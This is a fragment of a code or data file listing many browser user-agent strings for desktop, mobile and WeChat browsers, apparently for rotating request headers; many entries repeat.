     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN'
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
